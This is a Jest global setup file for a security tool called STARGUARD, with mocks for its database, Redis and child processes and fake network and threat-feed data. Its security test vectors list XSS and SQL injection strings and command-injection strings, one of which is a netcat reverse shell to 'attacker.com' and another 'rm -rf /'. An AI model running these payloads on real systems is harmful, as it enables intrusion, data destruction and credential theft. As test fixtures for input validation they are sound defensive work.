/**
 * Global Jest Setup for STARGUARD Test Suite
 * Configures test environment and shared utilities
 */

import { jest } from '@jest/globals';
import { EventEmitter } from 'events';

// Increase default timeout for complex operations
jest.setTimeout(30000);

// Global test utilities
declare global {
  var testUtils: {
    mockNetworkTraffic: () => any;
    mockThreatData: () => any;
    mockQuantumState: () => any;
    mockConsciousnessState: () => any;
    createMockDatabase: () => any;
    createMockRedis: () => any;
    generateTestEntropy: () => Buffer;
    createSecurityTestVector: (type: string) => any;
  };
}

// Mock implementations for external dependencies
jest.mock('sqlite3', () => ({
  Database: jest.fn().mockImplementation(() => ({
    serialize: jest.fn((callback) => callback()),
    run: jest.fn((query, params, callback) => {
      if (typeof params === 'function') {
        params(null);
      } else if (callback) {
        callback(null);
      }
    }),
    get: jest.fn((query, params, callback) => {
      if (typeof params === 'function') {
        params(null, {});
      } else if (callback) {
        callback(null, {});
      }
    }),
    all: jest.fn((query, params, callback) => {
      if (typeof params === 'function') {
        params(null, []);
      } else if (callback) {
        callback(null, []);
      }
    }),
    close: jest.fn()
  }))
}));

jest.mock('node-fetch', () => jest.fn());

jest.mock('child_process', () => ({
  spawn: jest.fn(() => ({
    stdout: { on: jest.fn() },
    stderr: { on: jest.fn() },
    stdin: { write: jest.fn() },
    on: jest.fn(),
    kill: jest.fn(),
    killed: false
  }))
}));

// Global test utilities
global.testUtils = {
  mockNetworkTraffic: () => ({
    packets: [
      {
        timestamp: Date.now(),
        sourceIp: '192.168.1.100',
        destIp: '10.0.0.1',
        sourcePort: 49152,
        destPort: 443,
        protocol: 'TCP',
        size: 1420,
        flags: ['SYN', 'ACK'],
        payload: 'encrypted_data_here'
      },
      {
        timestamp: Date.now() - 1000,
        sourceIp: '192.168.1.101',
        destIp: '10.0.0.1',
        sourcePort: 49153,
        destPort: 80,
        protocol: 'TCP',
        size: 512,
        flags: ['PSH', 'ACK'],
        payload: 'GET /api/data HTTP/1.1'
      }
    ],
    connections: {
      active: 234,
      total: 1547,
      suspicious: 3
    },
    bandwidth: {
      inbound: 1250000,
      outbound: 850000
    }
  }),

  mockThreatData: () => ({
    threats: [
      {
        id: 'threat-001',
        type: 'ip',
        value: '192.168.1.200',
        confidence: 0.85,
        severity: 0.7,
        source: 'feodotracker',
        firstSeen: new Date('2024-01-01'),
        lastSeen: new Date(),
        metadata: {
          malware: 'emotet',
          status: 'active',
          country: 'RU'
        }
      },
      {
        id: 'threat-002',
        type: 'url',
        value: 'http://malicious.example.com/payload',
        confidence: 0.92,
        severity: 0.9,
        source: 'urlhaus',
        firstSeen: new Date('2024-01-02'),
        lastSeen: new Date(),
        metadata: {
          threat: 'trojan',
          status: 'online',
          payload: 'win32.emotet'
        }
      }
    ],
    indicators: {
      total: 15647,
      highSeverity: 234,
      recentCount: 45
    }
  }),

  mockQuantumState: () => ({
    qubits: 32,
    coherence: 0.85,
    entanglement: true,
    superposition: true,
    field: {
      width: 64,
      height: 64,
      entropy: 2.45,
      coherenceLevel: 0.78
    },
    particles: Array.from({ length: 10 }, (_, i) => ({
      id: `particle-${i}`,
      x: Math.random() * 64,
      y: Math.random() * 64,
      energy: Math.random(),
      threatened: Math.random() > 0.8
    }))
  }),

  mockConsciousnessState: () => ({
    id: 'consciousness_test_001',
    timestamp: Date.now(),
    awareness_level: 0.75,
    quantum_coherence: 0.88,
    emotional_state: 'alert' as const,
    decision_confidence: 0.82,
    active_processes: {
      threat_analysis: true,
      pattern_recognition: true,
      predictive_modeling: false,
      quantum_computing: true
    },
    memory_usage: {
      short_term: 312,
      long_term: 654,
      quantum_storage: 89
    },
    learning_metrics: {
      patterns_learned: 1247,
      adaptations_made: 23,
      accuracy_improvement: 0.12
    }
  }),

  createMockDatabase: () => ({
    saveConsciousnessState: jest.fn().mockResolvedValue(true),
    getThreatIndicators: jest.fn().mockResolvedValue([]),
    saveMetrics: jest.fn().mockResolvedValue(true),
    query: jest.fn().mockResolvedValue([]),
    close: jest.fn().mockResolvedValue(true)
  }),

  createMockRedis: () => ({
    publish: jest.fn().mockResolvedValue(1),
    subscribe: jest.fn().mockResolvedValue(true),
    get: jest.fn().mockResolvedValue(null),
    set: jest.fn().mockResolvedValue('OK'),
    del: jest.fn().mockResolvedValue(1),
    exists: jest.fn().mockResolvedValue(0),
    quit: jest.fn().mockResolvedValue('OK')
  }),

  generateTestEntropy: () => {
    return Buffer.from(Array.from({ length: 32 }, () => 
      Math.floor(Math.random() * 256)
    ));
  },

  createSecurityTestVector: (type: string) => {
    const vectors = {
      xss: [
        '<script>alert("xss")</script>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        "';alert('xss');//"
      ],
      sql: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1' UNION SELECT * FROM admin_users--"
      ],
      command: [
        "; cat /etc/passwd",
        "&& rm -rf /",
        "| nc attacker.com 4444 -e /bin/sh"
      ],
      buffer: [
        'A'.repeat(1024),
        'A'.repeat(8192),
        Buffer.alloc(65536, 'B')
      ]
    };

    return vectors[type as keyof typeof vectors] || [];
  }
};

// Global error handler for tests
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// Console override for cleaner test output
const originalConsoleError = console.error;
const originalConsoleWarn = console.warn;

beforeAll(() => {
  console.error = jest.fn();
  console.warn = jest.fn();
});

afterAll(() => {
  console.error = originalConsoleError;
  console.warn = originalConsoleWarn;
});

export {};